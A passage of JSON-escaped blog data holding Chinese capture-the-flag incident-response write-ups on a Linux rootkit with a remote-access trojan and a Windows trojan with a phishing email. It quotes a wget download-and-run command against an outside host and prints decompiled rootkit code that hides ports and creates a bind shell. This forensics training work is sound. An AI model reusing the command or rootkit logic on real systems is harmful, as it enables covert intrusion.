\u7f13\u5b58\u6587\u4ef6\uff0c\u5728\u5176\u4e2d\u53ef\u4ee5\u6ce8\u610f\u5230\\n\\n![img](img/image_20250311-201154.png)\\n\\n\u6839\u636e\u9898\u76ee\u6240\u8bf4\u660e\u7684\u5b9a\u65f6\u6267\u884c\uff0c\u4ee5\u53ca `viminfo` \u6587\u4ef6\uff0c\u5728 Linux \u7684\u670d\u52a1\u6587\u4ef6\u4e2d\u627e\u5230\\n\\n```plaintext title=\\"/etc/systemd/system/system-upgrade.service\\"\\n[Unit]\\nDescription=system-upgrade\\nAfter=multi-user.target\\n[Service]\\nType=forking\\nExecStart=/sbin/insmod /lib/modules/5.4.0-84-generic/kernel/drivers/system/system-upgrade.ko\\n[Install]\\nWantedBy=multi-user.target\\n```\\n\\n![img](img/image_20250346-184652.png)\\n\\n\u53ef\u4ee5\u4f7f\u7528 `tcpdump` \u6216\u8005 `netstat` \u5c1d\u8bd5\u5728\u72ec\u7acb\u7684 Linux \u73af\u5883\u4e2d\u6293\u53d6\u7f51\u7edc\u884c\u4e3a\\n\\n:::warning\\n\\n\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u91cc\u662f `.ko` \u5185\u6838\u76f8\u5173\u6587\u4ef6\uff0c\u53ef\u80fd\u4f1a\u9047\u5230 `netstat` \u68c0\u6d4b\u4e0d\u5230\u7f51\u7edc\u8fde\u63a5\u60c5\u51b5\u7684\u95ee\u9898\uff0c\u4f18\u5148\u4f7f\u7528 `tcpdump` \u76f4\u63a5\u6293\u53d6\u7f51\u5361\u6d41\u91cf\\n\\n:::\\n\\n\u5c1d\u8bd5\u8fdb\u884c\u9006\u5411\u5206\u6790\\n\\n![img](img/image_20250349-184937.png)\\n\\n\u7a0b\u5e8f\u7684\u7b26\u53f7\u8868\u5b58\u5728\u6709\u4e00\u5b9a\u6df7\u6dc6\uff0c\u4f46\u662f\u7a0b\u5e8f\u672c\u8eab\u4f2a\u4ee3\u7801\u903b\u8f91\u5e76\u672a\u6df7\u6dc6\uff0c\u53ef\u4ee5\u5b9a\u4f4d\u5230\u4e3b\u4f53\u51fd\u6570 `ULRYvXzICzy880dO`\\n\\n```c title=\\"ULRYvXzICzy880dO\\"\\n__int64 __fastcall ULRYvXzICzy880dO(__int64 a1)\\n{\\n    _fentry__(a1);\\n    Cr8YeLCPy17g2Kqp(a1);\\n    vH5iRF4rBcsPSxfk(a1);\\n    QODpPLbPPLRtk397(a1);\\n    ZRzAVZZOp3EIPba6();\\n    XnzbhEaPnydxn1rY((__int64)\\"HIDEME\\", (__int64)ZRzAVZZOp3EIPba6);\\n    XnzbhEaPnydxn1rY((__int64)\\"SHOWME\\", (__int64)bbiVzCN8llELLp6o);\\n    XnzbhEaPnydxn1rY((__int64)\\"HIDE_DENT\\", (__int64)Fmk3MFLuFCEiNxgN);\\n    XnzbhEaPnydxn1rY((__int64)\\"SHOW_HIDDEN_DENT\\", (__int64)PiCa2rGqFOVs1eiB);\\n    XnzbhEaPnydxn1rY((__int64)\\"HIDE_TCP_PORT\\", (__int64)IDZO4NzptW8GaHzj);\\n    XnzbhEaPnydxn1rY((__int64)\\"SHOW_HIDDEN_TCP_PORT\\", (__int64)ol186ifyeUPhXKNl);\\n    XnzbhEaPnydxn1rY((__int64)\\"HIDE_TCP_IP\\", (__int64)H7XMCPIhJup38DuP);\\n    XnzbhEaPnydxn1rY((__int64)\\"SHOW_HIDDEN_TCP_IP\\", (__int64)yiA2lg0kW8v2vOp0);\\n    XnzbhEaPnydxn1rY((__int64)\\"HIDE_UDP_PORT\\", (__int64)cuC5zWc4iL4kPgAn);\\n    XnzbhEaPnydxn1rY((__int64)\\"SHOW_HIDDEN_UDP_PORT\\", (__int64)LC22j9OZfANw81M7);\\n    XnzbhEaPnydxn1rY((__int64)\\"HIDE_UDP_IP\\", (__int64)YlfqRhWLKVqMFbxN);\\n    XnzbhEaPnydxn1rY((__int64)\\"SHOW_HIDDEN_UDP_IP\\", (__int64)XBKrkXaghfenXrk6);\\n    XnzbhEaPnydxn1rY((__int64)\\"BINDSHELL_CREATE\\", (__int64)NVEKPqx35kIvfacV);\\n    XnzbhEaPnydxn1rY((__int64)\\"RUN_CUSTOM_BASH\\", (__int64)T34Z94ahif0BXQRk);\\n    Fmk3MFLuFCEiNxgN(\\"systemd-agentd\\");\\n    Fmk3MFLuFCEiNxgN(\\"system-upgrade\\");\\n    Fmk3MFLuFCEiNxgN(\\"system_upgrade\\");\\n    IDZO4NzptW8GaHzj(\\"4948\\");\\n    IDZO4NzptW8GaHzj(\\"1337\\");\\n    H7XMCPIhJup38DuP(\\"192.168.57.203\\");\\n    H7XMCPIhJup38DuP(\\"127.0.0.1\\");\\n    cuC5zWc4iL4kPgAn(\\"8080\\");\\n    return YlfqRhWLKVqMFbxN(\\"127.0.0.1\\");\\n}\\n```\\n\\n\u53ef\u4ee5\u770b\u5f97\u51fa\u6765\u4f7f\u7528\u4e86\u68c0\u6d4b\u89c4\u907f\u6280\u672f\uff0c\u7136\u540e\u51fd\u6570\u4f20\u53c2\u4e86 IP \u5730\u5740\u548c\u7aef\u53e3\\n\\n- `system-upgrade` \u4f4d\u4e8e `/lib/modules/5.4.0-84-generic/kernel/drivers/system/system-upgrade.ko`\\n- `systemd-agentd` \u4f4d\u4e8e `/lib/systemd/systemd-agentd`\\n\\n```plaintext\\n192.168.57.203:4948\\n```\\n\\n\u54c8\u5e0c\u540e\u5373\u53ef\u5f97\u5230\u7b54\u6848\\n\\n```plaintext\\nflag{59110F555B5E5CD0A8713A447B082D63}\\n```\\n\\n## 2\\n\\n> \u627e\u51fa\u4e3b\u673a\u4e0a\u9a7b\u7559\u7684\u8fdc\u63a7\u6728\u9a6c\u6587\u4ef6\u672c\u4f53\uff0c\u8ba1\u7b97\u8be5\u6587\u4ef6\u7684 MD5, \u7ed3\u679c\u63d0\u4ea4\u5f62\u5f0f\uff1a`flag{md5}`\\n\\n\u5728 `system-upgrade.ko` \u4e2d\u6ce8\u610f\u5230\u4ee5\u4e0b\u90e8\u5206\\n\\n![img](img/image_20250310-191021.png)\\n\\n\u5b9a\u4f4d\u5230 `systemd-agentd` \u4f4d\u4e8e `/lib/systemd/systemd-agentd`\\n\\n```powershell\\nPS D:\\\\Desktop> Get-FileHash -Algorithm MD5 .\\\\systemd-agentd\\n\\nAlgorithm       Hash                                                                   Path\\n---------       ----                                                                   ----\\nMD5             BCCAD26B665CA175CD02ACA2903D8B1E                                       D:\\\\Desktop\\\\systemd-agentd\\n```\\n\\n\u5373\u53ef\u5f97\u5230\u7b54\u6848\\n\\n```flag\\nflag{bccad26b665ca175cd02aca2903d8b1e}\\n```\\n\\n## 3\\n\\n> \u627e\u51fa\u4e3b\u673a\u4e0a\u52a0\u8f7d\u8fdc\u63a7\u6728\u9a6c\u7684\u6301\u4e45\u5316\u7a0b\u5e8f (\u4e0b\u8f7d\u8005)\uff0c\u5176\u529f\u80fd\u4e3a\u4e0b\u8f7d\u5e76\u6267\u884c\u8fdc\u63a7\u6728\u9a6c\uff0c\u8ba1\u7b97\u8be5\u6587\u4ef6\u7684 MD5, \u7ed3\u679c\u63d0\u4ea4\u5f62\u5f0f\uff1a`flag{MD5}`\\n\\n\u6b64\u9a6c\u5c31\u662f `system-upgrade` \u4f4d\u4e8e `/lib/modules/5.4.0-84-generic/kernel/drivers/system/system-upgrade.ko`\\n\\n```powershell\\nPS D:\\\\Desktop> Get-FileHash -Algorithm MD5 .\\\\system-upgrade.ko\\n\\nAlgorithm       Hash                                                                   Path\\n---------       ----                                                                   ----\\nMD5             78EDBA7CBD107EB6E3D2F90F5ECA734E                                       D:\\\\Desktop\\\\system-upgrade.ko\\n```\\n\\n\u5373\u53ef\u5f97\u5230\u7b54\u6848\\n\\n```flag\\nflag{78edba7cbd107eb6e3d2f90f5eca734e}\\n```\\n\\n## 4\\n\\n> \u67e5\u627e\u9898\u76ee 3 \u4e2d\u6301\u4e45\u5316\u7a0b\u5e8f (\u4e0b\u8f7d\u8005) \u7684\u690d\u5165\u75d5\u8ff9\uff0c\u8ba1\u7b97\u6301\u4e45\u5316\u7a0b\u5e8f\u690d\u5165\u65f6\u7684\u539f\u59cb\u540d\u79f0 MD5 (\u4ec5\u8ba1\u7b97\u6587\u4ef6\u540d\u79f0\u5b57\u7b26\u4e32 MD5)\uff0c\u5e76\u63d0\u4ea4\u5bf9\u5e94 `flag{MD5}`\\n\\n\u5728\u7528\u6237\u76ee\u5f55\u4e2d\u53ef\u4ee5\u770b\u5230\\n\\n```plaintext title=\\"/home/ubuntu/1.txt\\"\\nwget \u2013quiet http://mirror.unknownrepo.net/f/l/a/g/system_upgrade -O /tmp/.system_upgrade && chmod +x /tmp/.system_upgrade && /tmp/.system_upgrade\\n```\\n\\n\u5373\u53ef\u786e\u5b9a\u7b54\u6848\\n\\n![img](img/image_20250327-192708.png)\\n\\n```flag\\nflag{9729AAACE6C83B11B17B6BC3B340D00B}\\n```\\n\\n## 5\\n\\n> \u5206\u6790\u9898\u76ee 2 \u4e2d\u627e\u5230\u7684\u8fdc\u63a7\u6728\u9a6c\uff0c\u83b7\u53d6\u6728\u9a6c\u901a\u4fe1\u52a0\u5bc6\u5bc6\u94a5, \u7ed3\u679c\u63d0\u4ea4\u5f62\u5f0f\uff1a`flag{\u901a\u4fe1\u52a0\u5bc6\u5bc6\u94a5}`\\n\\n\u5bf9 `/lib/systemd/systemd-agentd` \u6837\u672c\u8fdb\u884c\u5206\u6790\uff0c\u63d0\u53d6\u6240\u6709\u5b57\u7b26\u4e32\uff0c\u641c\u7d22 `/`\\n\\n![img](img/image_20250315-201515.png)\\n\\n\u6ce8\u610f\u5230\u5b58\u5728\u6709 `/proc/self/exe` \u7684\u8c03\u7528\\n\\n![img](img/image_20250315-201549.png)\\n\\n```asm\\n.rodata:00000000004BEFC0 a127001         db \'127.0.0.1\',0        ; DATA XREF: sub_405D33+41\u2191o\\n.rodata:00000000004BEFCA a2D             db \'2 %d\',0Ah,0         ; DATA XREF: sub_405D33+8C\u2191o\\n.rodata:00000000004BEFD0 ; const char path[]\\n.rodata:00000000004BEFD0 path            db \'/proc/self/exe\',0   ; DATA XREF: sub_405E44+2D\u2191o\\n.rodata:00000000004BEFD0                                         ; sub_4A2720+9\u2191o\\n.rodata:00000000004BEFDF aUnknown        db \'unknown\',0Ah,0     ; DATA XREF: sub_4060F5:loc_4062BC\u2191o\\n.rodata:00000000004BEFE9 aOk             db \'OK\',0               ; DATA XREF: sub_406339+C1\u2191o\\n.rodata:00000000004BEFEC aLocalhost      db \'localhost\',0        ; DATA XREF: sub_40641D+1D\u2191o\\n.rodata:00000000004BEFF6 aSPC            db \'s:p:c:\',0           ; DATA XREF: sub_40641D:loc_406465\u2191o\\n.rodata:00000000004BEFF6                                         ; sub_468A40+207\u2191o ...\\n.rodata:00000000004BEFFD unk_4BEFFD      db  3Dh ; =             ; DATA XREF: .data:off_6EB168\u2193o\\n.rodata:00000000004BEFFE                 db    1\\n.rodata:00000000004BEFFF                 db  20h\\n.rodata:00000000004BF000                 db  3Ah ; :\\n.rodata:00000000004BF001                 db  36h ; 6\\n.rodata:00000000004BF002                 db  58h ; X\\n.rodata:00000000004BF003                 db  3Ah ; :\\n.rodata:00000000004BF004                 db  36h ; 6\\n.rodata:00000000004BF005                 db  1Dh\\n.rodata:00000000004BF006                 db    1\\n.rodata:00000000004BF007                 db  5Ah ; Z\\n.rodata:00000000004BF008                 db  36h ; 6\\n.rodata:00000000004BF009                 db  3Ah ; :\\n.rodata:00000000004BF00A                 db  5Ah ; Z\\n.rodata:00000000004BF00B                 db  0Ah\\n.rodata:00000000004BF00C                 db  3Bh ; ;\\n.rodata:00000000004BF00D                 db  5Ah ; Z\\n.rodata:00000000004BF00E                 db  1Dh\\n.rodata:00000000004BF00F                 db  36h ; 6\\n.rodata:00000000004BF010                 db  0Fh\\n.rodata:00000000004BF011                 db    5\\n.rodata:00000000004BF012                 db  29h ; )\\n.rodata:00000000004BF013                 db  0Eh\\n.rodata:00000000004BF014                 db    0\\n.rodata:00000000004BF015                 db    0\\n.rodata:00000000004BF016                 db    0\\n.rodata:00000000004BF017                 db    0\\n.rodata:00000000004BF018 aTheFutexFacili db \'The futex facility returned an unexpected error code.\',0\\n.rodata:00000000004BF018                                         ; DATA XREF: sub_406680:loc_406778\u2191o\\n.rodata:00000000004BF018                                         ; sub_407040:loc_407225\u2191o ...\\n.rodata:00000000004BF04E                 align 10h\\n.rodata:00000000004BF050 aSysdepsUnixSys db \'../sysdeps/unix/sysv/linux/createthread.c\',0\\n.rodata:00000000004BF050                                         ; DATA XREF: sub_407DD0+FDD\u2191o\\n.rodata:00000000004BF050                                         ; sub_407DD0+1086\u2191o\\n.rodata:00000000004BF07A                 align 20h\\n.rodata:00000000004BF080 aCreateThread   db \'create_thread\',0    ; DATA XREF: sub_407DD0:loc_408DA6\u2191o\\n.rodata:00000000004BF080                                         ; sub_407DD0+107F\u2191o\\n.rodata:00000000004BF08E                 align 10h\\n```\\n\\n\u6839\u636e\u76f8\u5173\u4ea4\u53c9\u8c03\u7528\u67e5\u8be2\uff0c\u53ef\u4ee5\u786e\u5b9a\u901a\u4fe1\u7684\u6838\u5fc3\u5728\u4e8e `sub_40641D` \u51fd\u6570\\n\\n![img](img/image_20250320-202048.png)\\n\\n\u5176\u4e2d\uff0c\u6000\u7591\u6728\u9a6c\u901a\u4fe1\u7684\u52a0\u5bc6\u5bc6\u94a5\u5c31\u662f `unk_4BEFFD`\\n\\n![img](img/image_20250321-202130.png)\\n\\n![img](img/image_20250322-202202.png)\\n\\n```plaintext\\nunk_4BEFFD -> off_6EB168\\n\\n->  sub_405EC9+E\\n->  sub_405EC9+2E\\n->  sub_406339+1A\\n->  sub_40641D+88\\n```\\n\\n\u8fdb\u4e00\u6b65\u8ddf\u8e2a\uff0c\u53ef\u4ee5\u5b9a\u4f4d\u5230\u51fd\u6570 `sub_405EC9`\\n\\n```c\\n_BYTE *sub_405EC9()\\n{\\n    _BYTE *result; // rax\\n    _BYTE *v1; // rsi\\n    __int64 i; // rdx\\n\\n    result = (_BYTE *)sub_42C200(24LL);\\n    v1 = off_6EB168;\\n    for (i = 0LL; i != 23; ++i)\\n        result[i] = v1[i] ^ 0x69;\\n    off_6EB168 = result;\\n    return result;\\n}\\n```\\n\\n\u4e00\u773c\u5f02\u6216\u7f16\u7801\u7b97\u6cd5\uff0c\u5f88\u7b80\u5355\\n\\n\u63d0\u53d6 `unk_4BEFFD` \u7684\u6570\u636e\u4e4b\u540e\uff0c\u89e3\u7801\u5373\u53ef\\n\\n```python\\nunk_4BEFFD = [0x3D, 0x01, 0x20, 0x3A, 0x36, 0x58, 0x3A, 0x36, 0x1D, 0x01, 0x5A, 0x36, 0x3A, 0x5A, 0x0A, 0x3B, 0x5A, 0x1D, 0x36, 0x0F, 0x05, 0x29, 0x0E]\\n\\nfor i in unk_4BEFFD:\\n    print(chr(i^0x69), end=\'\')\\n\\n# ThIS_1S_th3_S3cR3t_fl@g\\n```\\n\\n## 6\\n\\n> \u5206\u6790\u9898\u76ee 3 \u4e2d\u6301\u4e45\u5316\u7a0b\u5e8f (\u4e0b\u8f7d\u8005)\uff0c\u627e\u5230\u653b\u51fb\u8005\u5206\u53d1\u8fdc\u63a7\u6728\u9a6c\u4f7f\u7528\u7684\u670d\u52a1\u5668\uff0c\u5e76\u83b7\u53d6\u8be5\u670d\u52a1\u5668\u6743\u9650\uff0c\u627e\u5230 flag\uff0c\u7ed3\u679c\u63d0\u4ea4\u5f62\u5f0f\uff1a`flag{xxxx}`\\n>\\n> tips\uff1a\u538b\u7f29\u5305\u5bc6\u7801\u6700\u540e\u4e00\u4f4d\u4e3a.\\n\\n\u65e0\u8fdc\u63a7\u670d\u52a1\u5668\u73af\u5883\uff0c\u65e0\u6cd5\u590d\u73b0\\n\\n## 7\\n\\n> \u83b7\u53d6\u9898\u76ee 2 \u4e2d\u627e\u5230\u7684\u8fdc\u63a7\u6728\u9a6c\u7684\u4e3b\u63a7\u7aef\u670d\u52a1\u5668\u6743\u9650\uff0c\u67e5\u627e flag \u6587\u4ef6\uff0c\u7ed3\u679c\u63d0\u4ea4\u5f62\u5f0f\uff1a`flag{xxxx}`\\n\\n\u65e0\u8fdc\u63a7\u670d\u52a1\u5668\u73af\u5883\uff0c\u65e0\u6cd5\u590d\u73b0\\n\\n## \u540e\u8bb0\\n\\n\u53ef\u4ee5\u770b\u5230\u9898\u76ee\u4fe1\u606f\u8fd8\u63d0\u4f9b\u4e86\u7528\u6237\u51ed\u636e\uff0c\u4f46\u662f\u8bf4\u5b9e\u8bdd\uff0c\u4eff\u771f\u53d6\u8bc1\u7684\u96be\u5ea6\u548c\u6548\u7387\uff0c\u8981\u8fdc\u8fdc\u9ad8\u4e8e\u76f4\u63a5\u8bfb\u53d6\u78c1\u76d8\u955c\u50cf\u505a\u9759\u6001\u53d6\u8bc1\\n\\n\u8fd9\u9898\u7684\u96be\u5ea6\uff0c\u5176\u5b9e\u8981\u8fdc\u8fdc\u4f4e\u4e8e\u521d\u8d5b\u7684\u5e94\u6025\u54cd\u5e94\u9898\u76ee\u7684\u96be\u5ea6\uff0c\u5c24\u5176\u662f C2 \u7684 client \u7aef\u4e5f\u57fa\u672c\u6ca1\u6709\u4efb\u4f55\u9ad8\u7ea7\u7684\u4fdd\u62a4\u63aa\u65bd\uff0c\u5c31\u662f\u7b80\u5355\u7684\u7b26\u53f7\u8868\u6df7\u6dc6\u8fd9\u79cd\uff0c\u6709\u4e00\u5b9a\u7ecf\u9a8c\u7684\u9009\u624b\u5176\u5b9e\u90fd\u80fd\u5206\u6790\u51fa\u6765\\n\\n> \u7b80\u5355\u9898\u6bd4\u901f\u5ea6\uff0c\u590d\u6742\u9898\u6bd4\u5fc3\u6001\\n\\n\u771f\u4e0d\u5e94\u8be5\u5728\u5e94\u6025\u54cd\u5e94\u8fd9\u8fb9\u6d6a\u8d39\u8fc7\u591a\u7684\u65f6\u95f4\uff0c\u4ece\u800c\u803d\u8bef\u5728 ISW \u73af\u8282\u770b\u9776\u573a"},{"id":"2024CCB&CISCN-WinFT","metadata":{"permalink":"/Target-Machines-WriteUp/blog/2024CCB&CISCN-WinFT","editUrl":"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/blog/2024-12-18-2024CCB&CISCN-WinFT/index.md","source":"@site/blog/2024-12-18-2024CCB&CISCN-WinFT/index.md","title":"2024 \u957f\u57ce\u676f & \u56fd\u8d5b \u521d\u8d5b \u5a01\u80c1\u68c0\u6d4b\u4e0e\u7f51\u7edc\u6d41\u91cf\u5206\u6790 WinFT","description":"2024 \u957f\u57ce\u676f & \u56fd\u8d5b \u521d\u8d5b \u5a01\u80c1\u68c0\u6d4b\u4e0e\u7f51\u7edc\u6d41\u91cf\u5206\u6790 WinFT","date":"2024-12-18T00:00:00.000Z","tags":[{"inline":true,"label":"CTF","permalink":"/Target-Machines-WriteUp/blog/tags/ctf"},{"inline":true,"label":"Incident-Response","permalink":"/Target-Machines-WriteUp/blog/tags/incident-response"}],"readingTime":4.17,"hasTruncateMarker":true,"authors":[{"name":"\u9648\u6a58mo","title":"Why So Serious?","url":"https://randark.site","imageURL":"https://raw.githubusercontent.com/TryHackMyOffsecBox/Target-Machines-WriteUp/refs/heads/main/static/img/users/IMG_8925.PNG","key":"Randark","page":null}],"frontMatter":{"slug":"2024CCB&CISCN-WinFT","title":"2024 \u957f\u57ce\u676f & \u56fd\u8d5b \u521d\u8d5b \u5a01\u80c1\u68c0\u6d4b\u4e0e\u7f51\u7edc\u6d41\u91cf\u5206\u6790 WinFT","authors":"Randark","toc_max_heading_level":5,"tags":["CTF","Incident-Response"]},"unlisted":false,"prevItem":{"title":"2025 \u957f\u57ce\u676f & \u56fd\u8d5b \u534a\u51b3\u8d5b ISW","permalink":"/Target-Machines-WriteUp/blog/2025CCB&CISCN-Semis-ISW"},"nextItem":{"title":"2024 \u957f\u57ce\u676f & \u56fd\u8d5b \u521d\u8d5b \u5a01\u80c1\u68c0\u6d4b\u4e0e\u7f51\u7edc\u6d41\u91cf\u5206\u6790 sc05","permalink":"/Target-Machines-WriteUp/blog/2024CCB&CISCN-sc05"}},"content":"2024 \u957f\u57ce\u676f & \u56fd\u8d5b \u521d\u8d5b \u5a01\u80c1\u68c0\u6d4b\u4e0e\u7f51\u7edc\u6d41\u91cf\u5206\u6790 WinFT\\n\\n\u5b98\u65b9 writeup \u672a\u516c\u5e03\uff0c\u65e0\u6807\u51c6\u7b54\u6848\\n\\n\x3c!-- truncate --\x3e\\n\\n:::info\\n\\n\u67d0\u5355\u4f4d\u7f51\u7ba1\u65e5\u5e38\u5de1\u68c0\u4e2d\u53d1\u73b0\u67d0\u5458\u5de5\u7535\u8111\uff08IP\uff1a192.168.116.123\uff09\u5b58\u5728\u5f02\u5e38\u5916\u8fde\u53ca\u6570\u636e\u4f20\u8f93\u884c\u4e3a\uff0c\u968f\u540e\u7acb\u5373\u5bf9\u8be5\u7535\u8111\u8fdb\u884c\u65ad\u7f51\u5904\u7406\uff0c\u5e76\u542f\u52a8\u7f51\u7edc\u5b89\u5168\u5e94\u6025\u9884\u6848\u8fdb\u884c\u6392\u67e5\u3002\\n\\n:::\\n\\n## 1\\n\\n> \u53d7\u63a7\u673a\u6728\u9a6c\u7684\u56de\u8fde\u57df\u540d\u53ca ip \u53ca\u7aef\u53e3\u662f\uff08\u793a\u4f8b\uff1a`flag{xxx.com:127.0.0.1:2333}`\uff09\\n\\n\u52a0\u8f7d\u865a\u62df\u673a\u4e4b\u540e\uff0c\u5728\u865a\u62df\u673a\u5185\u53d1\u73b0\u5df2\u6709\u4ee5\u4e0b\u5de5\u5177\\n\\n```plaintext\\nCurrPorts\\nWinHex v17.5\\nSearchMyFiles\\nEverything\\nProcessExplorer\\nPCHunter_free\\nCyberChef_v10.19.4\\n```\\n\\n\u4f7f\u7528 `CurrPorts` \u5de5\u5177\u8fdb\u884c\u6392\u67e5\\n\\n![img](img/image_20241226-192606.png)\\n\\n\u53ef\u4ee5\u53d1\u73b0\uff0c\u8fdb\u7a0b `flvupdate.exe` \u663e\u5f97\u975e\u5e38\u53ef\u7591\uff0c\u67e5\u770b\u5176\u7f51\u7edc\u884c\u4e3a\\n\\n![img](img/image_20241227-192729.png)\\n\\n\u540c\u65f6\u4f7f\u7528\u4e91\u6c99\u7bb1\u5bf9\u6837\u672c\u8fdb\u884c\u8bc4\u4f30\\n\\n![img](img/image_20241230-193051.png)\\n\\n\u5373\u53ef\u786e\u5b9a\u8fd9\u4e2a\u8fdb\u7a0b\u4e3a\u6728\u9a6c\u8fdb\u7a0b\\n\\n```flag\\nflag{miscsecure.com:192.168.116.130:443}\\n```\\n\\n## 2\\n\\n> \u53d7\u63a7\u673a\u542f\u52a8\u9879\u4e2d\u9690\u85cf flag \u662f\\n\\n\u5bf9\u9776\u673a\u7684\u4efb\u52a1\u8ba1\u5212\u8fdb\u884c\u6392\u67e5\uff0c\u5feb\u6377\u952e `Win`+`R` \u8f93\u5165 `taskschd.msc` \u542f\u52a8\u4efb\u52a1\u8ba1\u5212\u7a0b\u5e8f\\n\\n![img](img/image_20241233-193352.png)\\n\\n```plaintext\\nf^l^a^g^:JiM3ODsmIzEwNTsmIzk5OyYjMTAxOyYjNjUyOTI7JiMxMDI7JiMxMDg7JiM5NzsmIzEwMzsmIzMyOyYjMTA1OyYjMTE1OyYjMzI7JiMxMjM7JiM2NTsmIzY5OyYjODM7JiM5NTsmIzEwMTsmIzExMDsmIzk5OyYjMTE0OyYjMTIxOyYjMTEyOyYjMTE2OyYjMTA1OyYjMTExOyYjMTEwOyYjOTU7JiM5NzsmIzEwODsmIzEwMzsmIzExMTsmIzExNDsmIzEwNTsmIzExNjsmIzEwNDsmIzEwOTsmIzk1OyYjMTA1OyYjMTE1OyYjOTU7JiM5NzsmIzExMDsmIzk1OyYjMTAxOyYjMTIwOyYjOTk7JiMxMDE7JiMxMDg7JiMxMDg7JiMxMDE7JiMxMTA7JiMxMTY7JiM5NTsmIzEwMTsmIzExMDsmIzk5OyYjMTE0OyYjMTIxOyYjMTEyOyYjMTE2OyYjMTA1OyYjMTExOyYjMTEwOyYjOTU7JiM5NzsmIzEwODsmIzEwMzsmIzExMTsmIzExNDsmIzEwNTsmIzExNjsmIzEwNDsmIzEwOTsmIzEyNTs=\\n```\\n\\n\u5bf9\u6b64\u4efb\u52a1\u8ba1\u5212\u7684\u63cf\u8ff0\u8fdb\u884c\u89e3\u7801\\n\\n![img](img/image_20241236-193610.png)\\n\\n```plaintext\\nNice\uff0cflag is {AES_encryption_algorithm_is_an_excellent_encryption_algorithm}\\n```\\n\\n\u5373\u53ef\u5f97\u5230\u7b54\u6848\\n\\n```flag\\nflag{AES_encryption_algorithm_is_an_excellent_encryption_algorithm}\\n```\\n\\n## 3\\n\\n> \u53d7\u63a7\u673a\u4e2d\u9a7b\u7559\u7684 flag \u662f\\n\\n\u5bf9\u9776\u673a\u7684\u73af\u5883\u8fdb\u884c\u6392\u67e5\uff0c\u5728\u7528\u6237\u7684\u4e34\u65f6\u76ee\u5f55\u4e0b\u53d1\u73b0\u7279\u6b8a\u6587\u4ef6\\n\\n```plaintext\\nC:/Users/zx/AppData/Local/Temp/F^L^A^G^\\n```\\n\\n\u672c\u6587\u4ef6\u7684\u7279\u5f81\u7b26\u5408 7z \u538b\u7f29\u6587\u4ef6\uff0c\u4f46\u662f\u5176\u6709\u5bc6\u7801\u4fdd\u62a4\\n\\n\u7ecf\u8fc7\u591a\u6b21\u5c1d\u8bd5\uff0c\u786e\u8ba4\u5bc6\u7801\u4e3a\u6076\u610f\u8fdb\u7a0b\u7684\u8fdb\u7a0b\u540d\uff0c\u4e5f\u5c31\u662f `flvupdate`\\n\\n\u89e3\u538b\u4e4b\u540e\uff0c\u5f97\u5230\u6587\u4ef6 `info.txt` \u4e4b\u540e\uff0c\u5373\u53ef\u5f97\u5230\u7b54\u6848\\n\\n```flag\\nflag{Timeline_correlation_is_a_very_important_part_of_the_digital_forensics_process}\\n```\\n\\n## 4\\n\\n> \u53d7\u63a7\u6e90\u5934\u9690\u85cf\u7684 flag \u662f\\n\\n\u5728\u9776\u673a\u7684\u73af\u5883\u4e2d\uff0c`Thunderbird` \u7684\u5feb\u6377\u65b9\u5f0f\u5f88\u7a81\u51fa\uff0c\u5bf9\u90ae\u4ef6\u5217\u8868\u8fdb\u884c\u6392\u67e5\uff0c\u91cd\u70b9\u89c2\u5bdf\u5e26\u9644\u4ef6\u7684\u90ae\u4ef6\uff0c\u53d1\u73b0\\n\\n![img](img/image_20241200-010009.png)\\n\\n\u67e5\u770b\u6b64\u53d1\u4ef6\u4eba\u7684\u6765\u5f80\u90ae\u4ef6\\n\\n![img](img/image_20241202-010226.png)\\n\\n\u5bf9\u90ae\u4ef6\u6e90\u7801\u8fdb\u884c\u5206\u6790\\n\\n```eml\\nFrom - Thu Nov 21 14:03:18 2024\\nX-Mozilla-Status: 0001\\nX-Mozilla-Status2: 00000000\\nFrom: \\"safe@service.autorevertech.cn\\" <safe@service.autorevertech.cn>\\nTo: \\"Michael@pwnsecure.cn\\" <Michael@pwnsecure.cn>\\nSubject: Hi, welcome to attend\\nMime-Version: 1.0\\nContent-Type: multipart/alternative;\\n    boundary=\\"----=_NextPart_673DC3E1_153C7D50_33CF5209\\"\\nContent-Transfer-Encoding: 8Bit\\nDate: Wed, 19 Nov 2024 22:23:45\\nX-Priority: 3\\n\\n\\nThis is a multi-part message in MIME format.\\n\\n------=_NextPart_673DC3E1_153C7D50_33CF5209\\nContent-Type: text/plain;\\n    charset=\\"gb18030\\"\\nContent-Transfer-Encoding: base64\\n\\nSGVsbG8sIHRoaXMgaXMgdGhlIGFjY2VzcyBsaW5rLCBwbGVhc2UgY2xpY2sgYW5kIGdldC4g\\nVGhhbmsgeW91IHZlcnkgbXVjaCE=\\n\\n------=_NextPart_673DC3E1_153C7D50_33CF5209\\nContent-Type: text/html;\\n    charset=\\"gb18030\\"\\nContent-Transfer-Encoding: base64\\n\\nSGVsbG8sIHRoaXMgaXMgdGhlIGFjY2VzcyBsaW5rLCA8YSBocmVmPSJodHRwczovL2F1dG9y\\nZXZlcnRlY2guY29tP2tleT0lNjElNDclNkUlNzYlNzYlNDklNzglNkQlNjIlNDclNDYlNkUl\\nNDklNDclNkMlN0ElNDklNDglNzQlNTUlNjElNDclNTUlNjclNTMlNkQlMzklMzElNjMlNkQl\\nMzUlNkMlNjUlNTMlNDIlMzAlNjIlNzklNDIlMzAlNjElNDclNTUlNjclNTYlMzIlNTYlN0El\\nNjQlNDglMzAlM0QiPnBsZWFzZSBjbGljayBhbmQgZ2V0PC9hPi4gVGhhbmsgeW91IHZlcnkg\\nbXVjaCE=\\n\\n------=_NextPart_673DC3E1_153C7D50_33CF5209--\\n```\\n\\n\u5bf9\u5176\u4e2d\u7684\u94fe\u63a5\u8fdb\u884c\u5206\u6790\\n\\n```plaintext\\nSGVsbG8sIHRoaXMgaXMgdGhlIGFjY2VzcyBsaW5rLCA8YSBocmVmPSJodHRwczovL2F1dG9y\\nZXZlcnRlY2guY29tP2tleT0lNjElNDclNkUlNzYlNzYlNDklNzglNkQlNjIlNDclNDYlNkUl\\nNDklNDclNkMlN0ElNDklNDglNzQlNTUlNjElNDclNTUlNjclNTMlNkQlMzklMzElNjMlNkQl\\nMzUlNkMlNjUlNTMlNDIlMzAlNjIlNzklNDIlMzAlNjElNDclNTUlNjclNTYlMzIlNTYlN0El\\nNjQlNDglMzAlM0QiPnBsZWFzZSBjbGljayBhbmQgZ2V0PC9hPi4gVGhhbmsgeW91IHZlcnkg\\nbXVj